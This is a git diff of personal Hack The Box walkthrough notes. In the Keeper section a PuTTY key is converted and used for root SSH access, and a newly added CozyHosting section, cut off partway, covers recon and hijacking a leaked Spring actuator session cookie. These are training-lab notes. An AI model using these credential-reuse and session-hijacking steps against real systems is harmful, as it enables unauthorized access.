@@ -304,13 +304,14 @@ curl -i -s -k -X $'POST' \
         - but the root PW doesnt work...
         - it is a putty user key file with fake PW...we can convert it back to an ssh key
             - lets use `puttygen` to convert ppk file into a pem file
-            - copy notes to a file -> `keeper.txt`
-                - `puttygen keeper.txt -0 private-openssh -0 id_rsa`
-                    - note: you have to have version newer than 0.75
-    - access ssh
-        - ssh -i htb.pem root@keeper.htb
-
-rødgrød med fløde 
+            - copy notes to a file -> `keeper.ppk`
+   - `puttygen keeper.ppk -O private-openssh -o htb.pem`
+       - note: you have to have version newer than 0.75
+       - we obtained htb.pem file with SSH key to connect...
+   - access ssh
+       - ssh -i htb.pem root@10.10.11.227
+        - ls
+        - cat root.txt
 
 ## Sau
 Foothold: This basket is powered by “you can google it”. Look up for any flaws this software had in the past and test it from your side.
@@ -516,3 +517,24 @@ _laurel:x:998:998::/var/log/laurel:/bin/false`
         - cd
         - ls -la
         - cat root.txt
+        
+## CozyHosting
+### Reco
+- nmap -sVC 10.10.11.230
+    - 22 SSH
+    - 80 HTTP -> redirect to http://cozyhosting.htb
+        - add to /etc/hosts
+    - 8083 HTTP -> SimpleHTTPServer 0.6 (Python 3.10.12)
+ 
+### Enumeration
+- dirserach
+    - ./dirsearch.py -u http://cozyhosting.htb/
+        - 200 -   98B  - /actuator/sessions
+    - http://cozyhosting.htb/actuator/sessions
+        - {"E7BC8CEC4DC565E94F783CB373AF588C":"UNAUTHORIZED","D0922D83F1AA18A2733F3BE29363EBD4":"UNAUTHORIZED","60A7EC7AC7521A33D2D21FF3A5D7169A":"kanderson"}
+        - 60A7EC7AC7521A33D2D21FF3A5D7169A:kanderson 
+            - we obtained the cookie session -> use it to login 
+- LOGIN
+    - http://cozyhosting.htb/login
+    - F12 -> Storage -> replace cookie and refresh the page
+        - 
